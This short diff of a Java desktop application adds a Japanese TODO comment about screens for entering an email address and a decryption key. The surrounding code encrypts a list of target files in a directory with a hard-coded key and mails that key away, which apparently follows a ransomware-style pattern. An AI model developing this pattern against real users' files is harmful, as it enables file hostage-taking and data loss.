@@ -31,6 +31,8 @@ public class Execute extends Application {
     } else {
       cryption.exeEncrypt(searchTarget.getTargetList(), dirPath , CryptionKeys.COMMON_KEY);
       MailSendUtility.send("Your Decryption Key", CryptionKeys.COMMON_KEY);
+
+      // TODO fxml で「Decryption Key を受け取るメールアドレス入力」「Decryption Key 入力」実装
     }
   }
 }
